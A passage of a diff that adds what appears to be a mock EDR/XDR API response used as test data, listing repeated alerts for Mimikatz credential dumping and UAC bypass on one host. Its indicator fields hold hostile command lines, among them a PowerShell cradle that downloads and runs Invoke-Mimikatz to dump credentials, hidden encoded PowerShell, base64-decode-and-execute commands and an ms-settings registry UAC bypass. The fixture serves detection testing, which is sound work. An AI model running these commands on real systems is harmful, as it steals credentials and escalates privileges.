+              "type": "registry_value_data",
+              "field": "objectRegistryData",
+              "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            }
+          ]
+        },
+        {
+          "schemaVersion": "1.12",
+          "id": "WB-9002-20220906-00006",
+          "investigationStatus": "New",
+          "workbenchLink": "https://THE_WORKBENCH_URL",
+          "alertProvider": "SAE",
+          "model": "Credential Dumping via Mimikatz",
+          "score": 64,
+          "severity": "high",
+          "createdDateTime": "2022-09-06T02:49:30Z",
+          "updatedDateTime": "2022-09-06T02:49:50Z",
+          "impactScope": {
+            "desktopCount": 1,
+            "serverCount": 0,
+            "accountCount": 1,
+            "emailAddressCount": 0,
+            "entities": [
+              {
+                "entityType": "account",
+                "entityValue": "shockwave\\sam",
+                "entityId": "shockwave\\sam",
+                "relatedEntities": [
+                  "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+                ],
+                "relatedIndicatorIds": [],
+                "provenance": [
+                  "Alert"
+                ]
+              },
+              {
+                "entityType": "host",
+                "entityValue": {
+                  "guid": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                  "name": "nimda",
+                  "ips": [
+                    "10.10.58.51"
+                  ]
+                },
+                "entityId": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                "relatedEntities": [
+                  "shockwave\\sam"
+                ],
+                "relatedIndicatorIds": [
+                  1,
+                  2,
+                  3,
+                  4,
+                  5,
+                  6,
+                  7
+                ],
+                "provenance": [
+                  "Alert"
+                ]
+              }
+            ]
+          },
+          "description": "A user obtained account logon information that can be used to access remote systems via Mimikatz.",
+          "matchedRules": [
+            {
+              "id": "1288958d-3062-4a75-91fc-51b2a49bc7d7",
+              "name": "Potential Credential Dumping via Mimikatz",
+              "matchedFilters": [
+                {
+                  "id": "49d327c4-361f-43f0-b66c-cab433495e42",
+                  "name": "Possible Credential Dumping via Mimikatz",
+                  "matchedDateTime": "2022-09-05T03:53:57.199Z",
+                  "mitreTechniqueIds": [
+                    "V9.T1003.001",
+                    "V9.T1059.003",
+                    "V9.T1212"
+                  ],
+                  "matchedEvents": [
+                    {
+                      "uuid": "e168a6e5-27b1-462b-ad3e-5146df4e6aa5",
+                      "matchedDateTime": "2022-09-05T03:53:57.199Z",
+                      "type": "TELEMETRY_PROCESS"
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "indicators": [
+            {
+              "id": 1,
+              "type": "command_line",
+              "field": "objectCmd",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe \"iex (new-object net.webclient).downloadstring(\" \"https://raw.githubusercontent.com/mattifestation/powersploit/master/exfiltration/invoke-mimikatz.ps1); invoke-mimikatz -dumpcreds\"",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 2,
+              "type": "command_line",
+              "field": "processCmd",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden -enc ......aakaakaekavgaracqaswapackafabjaeuawaa=",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 3,
+              "type": "command_line",
+              "field": "parentCmd",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden -c $x=$((gp hkcu:software\\microsoft\\windows update).update); powershell -nop -noni -w hidden -enc $x",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 4,
+              "type": "file_sha1",
+              "field": "objectFileHashSha1",
+              "value": "1B3B40FBC889FD4C645CC12C85D0805AC36BA254",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 5,
+              "type": "fullpath",
+              "field": "objectFilePath",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 6,
+              "type": "fullpath",
+              "field": "processFilePath",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 7,
+              "type": "text",
+              "field": "endpointHostName",
+              "value": "Nimda",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            }
+          ]
+        },
+        {
+          "schemaVersion": "1.12",
+          "id": "WB-9002-20220906-00007",
+          "investigationStatus": "New",
+          "workbenchLink": "https://THE_WORKBENCH_URL",
+          "alertProvider": "SAE",
+          "model": "Privilege Escalation via UAC Bypass",
+          "score": 64,
+          "severity": "high",
+          "createdDateTime": "2022-09-06T02:49:31Z",
+          "updatedDateTime": "2022-09-06T02:49:48Z",
+          "impactScope": {
+            "desktopCount": 1,
+            "serverCount": 0,
+            "accountCount": 1,
+            "emailAddressCount": 0,
+            "entities": [
+              {
+                "entityType": "account",
+                "entityValue": "shockwave\\sam",
+                "entityId": "shockwave\\sam",
+                "relatedEntities": [
+                  "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+                ],
+                "relatedIndicatorIds": [],
+                "provenance": [
+                  "Alert"
+                ]
+              },
+              {
+                "entityType": "host",
+                "entityValue": {
+                  "guid": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                  "name": "nimda",
+                  "ips": [
+                    "10.10.58.51"
+                  ]
+                },
+                "entityId": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                "relatedEntities": [
+                  "shockwave\\sam"
+                ],
+                "relatedIndicatorIds": [
+                  1,
+                  2,
+                  3,
+                  4,
+                  5,
+                  6,
+                  7,
+                  8
+                ],
+                "provenance": [
+                  "Alert"
+                ]
+              }
+            ]
+          },
+          "description": "A user bypassed User Account Control (UAC) to gain higher-level permissions.",
+          "matchedRules": [
+            {
+              "id": "25d96e5d-cb69-4935-ae27-43cc0cdca1cc",
+              "name": "(T1088) Bypass UAC via shell open registry",
+              "matchedFilters": [
+                {
+                  "id": "ac200e74-8309-463e-ad6b-a4c16a3a377f",
+                  "name": "Bypass UAC Via Shell Open Default Registry",
+                  "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                  "mitreTechniqueIds": [
+                    "T1112",
+                    "V9.T1112",
+                    "V9.T1548.002"
+                  ],
+                  "matchedEvents": [
+                    {
+                      "uuid": "a32599b7-c0c9-45ed-97bf-f2be7679fb00",
+                      "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                      "type": "TELEMETRY_REGISTRY"
+                    }
+                  ]
+                },
+                {
+                  "id": "857b6396-da29-44a8-bc11-25298e646795",
+                  "name": "Bypass UAC Via Shell Open Registry",
+                  "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                  "mitreTechniqueIds": [
+                    "T1112",
+                    "T1088",
+                    "V9.T1112",
+                    "V9.T1548.002"
+                  ],
+                  "matchedEvents": [
+                    {
+                      "uuid": "4c456bbb-2dfc-40a5-b298-799a0ccefc01",
+                      "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                      "type": "TELEMETRY_REGISTRY"
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "indicators": [
+            {
+              "id": 1,
+              "type": "command_line",
+              "field": "processCmd",
+              "value": "c:\\windows\\system32\\rundll32.exe c:\\users\\sam\\appdata\\local\\cyzfc.dat entrypoint",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 2,
+              "type": "command_line",
+              "field": "parentCmd",
+              "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('....XggJHNjQjs=')); iex $r;  ",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 3,
+              "type": "command_line",
+              "field": "processCmd",
+              "value": "c:\\windows\\system32\\rundll32.exe c:\\users\\sam\\appdata\\local\\cyzfc.dat entrypoint",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 4,
+              "type": "command_line",
+              "field": "parentCmd",
+              "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('....jY0KTtpZXggJHNjQjs=')); iex $r;  ",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 5,
+              "type": "registry_key",
+              "field": "objectRegistryKeyHandle",
+              "value": "hkcr\\ms-settings\\shell\\open\\command",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 6,
+              "type": "registry_key",
+              "field": "objectRegistryKeyHandle",
+              "value": "hkcr\\ms-settings\\shell\\open\\command",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 7,
+              "type": "registry_value",
+              "field": "objectRegistryValue",
+              "value": "delegateexecute",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 8,
+              "type": "registry_value_data",
+              "field": "objectRegistryData",
+              "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            }
+          ]
+        },
+        {
+          "schemaVersion": "1.12",
+          "id": "WB-9002-20220906-00008",
+          "investigationStatus": "New",
+          "workbenchLink": "https://THE_WORKBENCH_URL",
+          "alertProvider": "SAE",
+          "model": "Credential Dumping via Mimikatz",
+          "score": 64,
+          "severity": "high",
+          "createdDateTime": "2022-09-06T02:49:30Z",
+          "updatedDateTime": "2022-09-06T02:49:50Z",
+          "impactScope": {
+            "desktopCount": 1,
+            "serverCount": 0,
+            "accountCount": 1,
+            "emailAddressCount": 0,
+            "entities": [
+              {
+                "entityType": "account",
+                "entityValue": "shockwave\\sam",
+                "entityId": "shockwave\\sam",
+                "relatedEntities": [
+                  "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+                ],
+                "relatedIndicatorIds": [],
+                "provenance": [
+                  "Alert"
+                ]
+              },
+              {
+                "entityType": "host",
+                "entityValue": {
+                  "guid": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                  "name": "nimda",
+                  "ips": [
+                    "10.10.58.51"
+                  ]
+                },
+                "entityId": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                "relatedEntities": [
+                  "shockwave\\sam"
+                ],
+                "relatedIndicatorIds": [
+                  1,
+                  2,
+                  3,
+                  4,
+                  5,
+                  6,
+                  7
+                ],
+                "provenance": [
+                  "Alert"
+                ]
+              }
+            ]
+          },
+          "description": "A user obtained account logon information that can be used to access remote systems via Mimikatz.",
+          "matchedRules": [
+            {
+              "id": "1288958d-3062-4a75-91fc-51b2a49bc7d7",
+              "name": "Potential Credential Dumping via Mimikatz",
+              "matchedFilters": [
+                {
+                  "id": "49d327c4-361f-43f0-b66c-cab433495e42",
+                  "name": "Possible Credential Dumping via Mimikatz",
+                  "matchedDateTime": "2022-09-05T03:53:57.199Z",
+                  "mitreTechniqueIds": [
+                    "V9.T1003.001",
+                    "V9.T1059.003",
+                    "V9.T1212"
+                  ],
+                  "matchedEvents": [
+                    {
+                      "uuid": "e168a6e5-27b1-462b-ad3e-5146df4e6aa5",
+                      "matchedDateTime": "2022-09-05T03:53:57.199Z",
+                      "type": "TELEMETRY_PROCESS"
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "indicators": [
+            {
+              "id": 1,
+              "type": "command_line",
+              "field": "objectCmd",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe \"iex (new-object net.webclient).downloadstring(\" \"https://raw.githubusercontent.com/mattifestation/powersploit/master/exfiltration/invoke-mimikatz.ps1); invoke-mimikatz -dumpcreds\"",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 2,
+              "type": "command_line",
+              "field": "processCmd",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden -enc ......aakaakaekavgaracqaswapackafabjaeuawaa=",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 3,
+              "type": "command_line",
+              "field": "parentCmd",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden -c $x=$((gp hkcu:software\\microsoft\\windows update).update); powershell -nop -noni -w hidden -enc $x",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 4,
+              "type": "file_sha1",
+              "field": "objectFileHashSha1",
+              "value": "1B3B40FBC889FD4C645CC12C85D0805AC36BA254",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 5,
+              "type": "fullpath",
+              "field": "objectFilePath",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 6,
+              "type": "fullpath",
+              "field": "processFilePath",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 7,
+              "type": "text",
+              "field": "endpointHostName",
+              "value": "Nimda",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            }
+          ]
+        },
+        {
+          "schemaVersion": "1.12",
+          "id": "WB-9002-20220906-00009",
+          "investigationStatus": "New",
+          "workbenchLink": "https://THE_WORKBENCH_URL",
+          "alertProvider": "SAE",
+          "model": "Privilege Escalation via UAC Bypass",
+          "score": 64,
+          "severity": "high",
+          "createdDateTime": "2022-09-06T02:49:31Z",
+          "updatedDateTime": "2022-09-06T02:49:48Z",
+          "impactScope": {
+            "desktopCount": 1,
+            "serverCount": 0,
+            "accountCount": 1,
+            "emailAddressCount": 0,
+            "entities": [
+              {
+                "entityType": "account",
+                "entityValue": "shockwave\\sam",
+                "entityId": "shockwave\\sam",
+                "relatedEntities": [
+                  "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+                ],
+                "relatedIndicatorIds": [],
+                "provenance": [
+                  "Alert"
+                ]
+              },
+              {
+                "entityType": "host",
+                "entityValue": {
+                  "guid": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                  "name": "nimda",
+                  "ips": [
+                    "10.10.58.51"
+                  ]
+                },
+                "entityId": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                "relatedEntities": [
+                  "shockwave\\sam"
+                ],
+                "relatedIndicatorIds": [
+                  1,
+                  2,
+                  3,
+                  4,
+                  5,
+                  6,
+                  7,
+                  8
+                ],
+                "provenance": [
+                  "Alert"
+                ]
+              }
+            ]
+          },
+          "description": "A user bypassed User Account Control (UAC) to gain higher-level permissions.",
+          "matchedRules": [
+            {
+              "id": "25d96e5d-cb69-4935-ae27-43cc0cdca1cc",
+              "name": "(T1088) Bypass UAC via shell open registry",
+              "matchedFilters": [
+                {
+                  "id": "ac200e74-8309-463e-ad6b-a4c16a3a377f",
+                  "name": "Bypass UAC Via Shell Open Default Registry",
+                  "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                  "mitreTechniqueIds": [
+                    "T1112",
+                    "V9.T1112",
+                    "V9.T1548.002"
+                  ],
+                  "matchedEvents": [
+                    {
+                      "uuid": "a32599b7-c0c9-45ed-97bf-f2be7679fb00",
+                      "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                      "type": "TELEMETRY_REGISTRY"
+                    }
+                  ]
+                },
+                {
+                  "id": "857b6396-da29-44a8-bc11-25298e646795",
+                  "name": "Bypass UAC Via Shell Open Registry",
+                  "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                  "mitreTechniqueIds": [
+                    "T1112",
+                    "T1088",
+                    "V9.T1112",
+                    "V9.T1548.002"
+                  ],
+                  "matchedEvents": [
+                    {
+                      "uuid": "4c456bbb-2dfc-40a5-b298-799a0ccefc01",
+                      "matchedDateTime": "2022-09-05T03:53:49.802Z",
+                      "type": "TELEMETRY_REGISTRY"
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "indicators": [
+            {
+              "id": 1,
+              "type": "command_line",
+              "field": "processCmd",
+              "value": "c:\\windows\\system32\\rundll32.exe c:\\users\\sam\\appdata\\local\\cyzfc.dat entrypoint",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 2,
+              "type": "command_line",
+              "field": "parentCmd",
+              "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('....XggJHNjQjs=')); iex $r;  ",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 3,
+              "type": "command_line",
+              "field": "processCmd",
+              "value": "c:\\windows\\system32\\rundll32.exe c:\\users\\sam\\appdata\\local\\cyzfc.dat entrypoint",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 4,
+              "type": "command_line",
+              "field": "parentCmd",
+              "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('....jY0KTtpZXggJHNjQjs=')); iex $r;  ",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 5,
+              "type": "registry_key",
+              "field": "objectRegistryKeyHandle",
+              "value": "hkcr\\ms-settings\\shell\\open\\command",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 6,
+              "type": "registry_key",
+              "field": "objectRegistryKeyHandle",
+              "value": "hkcr\\ms-settings\\shell\\open\\command",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 7,
+              "type": "registry_value",
+              "field": "objectRegistryValue",
+              "value": "delegateexecute",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "857b6396-da29-44a8-bc11-25298e646795"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 8,
+              "type": "registry_value_data",
+              "field": "objectRegistryData",
+              "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "ac200e74-8309-463e-ad6b-a4c16a3a377f"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            }
+          ]
+        },
+        {
+          "schemaVersion": "1.12",
+          "id": "WB-9002-20220906-00010",
+          "investigationStatus": "New",
+          "workbenchLink": "https://THE_WORKBENCH_URL",
+          "alertProvider": "SAE",
+          "model": "Credential Dumping via Mimikatz",
+          "score": 64,
+          "severity": "high",
+          "createdDateTime": "2022-09-06T02:49:30Z",
+          "updatedDateTime": "2022-09-06T02:49:50Z",
+          "impactScope": {
+            "desktopCount": 1,
+            "serverCount": 0,
+            "accountCount": 1,
+            "emailAddressCount": 0,
+            "entities": [
+              {
+                "entityType": "account",
+                "entityValue": "shockwave\\sam",
+                "entityId": "shockwave\\sam",
+                "relatedEntities": [
+                  "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+                ],
+                "relatedIndicatorIds": [],
+                "provenance": [
+                  "Alert"
+                ]
+              },
+              {
+                "entityType": "host",
+                "entityValue": {
+                  "guid": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                  "name": "nimda",
+                  "ips": [
+                    "10.10.58.51"
+                  ]
+                },
+                "entityId": "35FA11DA-A24E-40CF-8B56-BAF8828CC15E",
+                "relatedEntities": [
+                  "shockwave\\sam"
+                ],
+                "relatedIndicatorIds": [
+                  1,
+                  2,
+                  3,
+                  4,
+                  5,
+                  6,
+                  7
+                ],
+                "provenance": [
+                  "Alert"
+                ]
+              }
+            ]
+          },
+          "description": "A user obtained account logon information that can be used to access remote systems via Mimikatz.",
+          "matchedRules": [
+            {
+              "id": "1288958d-3062-4a75-91fc-51b2a49bc7d7",
+              "name": "Potential Credential Dumping via Mimikatz",
+              "matchedFilters": [
+                {
+                  "id": "49d327c4-361f-43f0-b66c-cab433495e42",
+                  "name": "Possible Credential Dumping via Mimikatz",
+                  "matchedDateTime": "2022-09-05T03:53:57.199Z",
+                  "mitreTechniqueIds": [
+                    "V9.T1003.001",
+                    "V9.T1059.003",
+                    "V9.T1212"
+                  ],
+                  "matchedEvents": [
+                    {
+                      "uuid": "e168a6e5-27b1-462b-ad3e-5146df4e6aa5",
+                      "matchedDateTime": "2022-09-05T03:53:57.199Z",
+                      "type": "TELEMETRY_PROCESS"
+                    }
+                  ]
+                }
+              ]
+            }
+          ],
+          "indicators": [
+            {
+              "id": 1,
+              "type": "command_line",
+              "field": "objectCmd",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe \"iex (new-object net.webclient).downloadstring(\" \"https://raw.githubusercontent.com/mattifestation/powersploit/master/exfiltration/invoke-mimikatz.ps1); invoke-mimikatz -dumpcreds\"",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 2,
+              "type": "command_line",
+              "field": "processCmd",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden -enc ......aakaakaekavgaracqaswapackafabjaeuawaa=",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 3,
+              "type": "command_line",
+              "field": "parentCmd",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -nop -noni -w hidden -c $x=$((gp hkcu:software\\microsoft\\windows update).update); powershell -nop -noni -w hidden -enc $x",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 4,
+              "type": "file_sha1",
+              "field": "objectFileHashSha1",
+              "value": "1B3B40FBC889FD4C645CC12C85D0805AC36BA254",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 5,
+              "type": "fullpath",
+              "field": "objectFilePath",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 6,
+              "type": "fullpath",
+              "field": "processFilePath",
+              "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            },
+            {
+              "id": 7,
+              "type": "text",
+              "field": "endpointHostName",
+              "value": "Nimda",
+              "relatedEntities": [
+                "35FA11DA-A24E-40CF-8B56-BAF8828CC15E"
+              ],
+              "filterIds": [
+                "49d327c4-361f-43f0-b66c-cab433495e42"
+              ],
+              "provenance": [
+                "Alert"
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    "headers": {
+      "Content-Type": "application/json"
+    }
+  }
+}
